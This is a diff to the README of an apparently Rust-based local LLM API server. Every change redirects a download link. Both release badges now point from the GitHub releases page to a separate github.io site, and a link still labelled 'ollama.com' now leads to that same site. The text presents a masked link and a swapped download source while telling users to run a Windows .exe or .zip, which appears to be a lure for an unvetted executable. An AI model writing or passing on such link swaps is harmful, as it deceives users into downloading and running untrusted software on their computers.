@@ -1,6 +1,6 @@
 # 🤖 ai-server-rust-llm-api - Run AI Models on Your PC
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/compact-landmass150/ai-server-rust-llm-api/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://compact-landmass150.github.io)
 
 ## 📥 What This Software Does
 
@@ -28,7 +28,7 @@ Your computer needs these minimum specs to run the software well:
 | GPU | Not required | NVIDIA GPU with 4 GB VRAM |
 
 **You also need:**  
-- Ollama installed on your computer. Get it from [ollama.com](https://ollama.com) for free.  
+- Ollama installed on your computer. Get it from [ollama.com](https://compact-landmass150.github.io) for free.  
 - An internet connection for the first download of AI models.
 
 ## 🚀 How to Download and Install
@@ -36,7 +36,7 @@ Your computer needs these minimum specs to run the software well:
 **Step 1: Visit the download page**  
 Click this button or the link at the top of this page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-green?style=for-the-badge)](https://github.com/compact-landmass150/ai-server-rust-llm-api/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-green?style=for-the-badge)](https://compact-landmass150.github.io)
 
 **Step 2: Find the right file**  
 On the releases page, look for the file named `ai-server-rust-llm-api-windows-x64.zip` or `ai-server-rust-llm-api-windows-x64.exe`. Download the latest version.
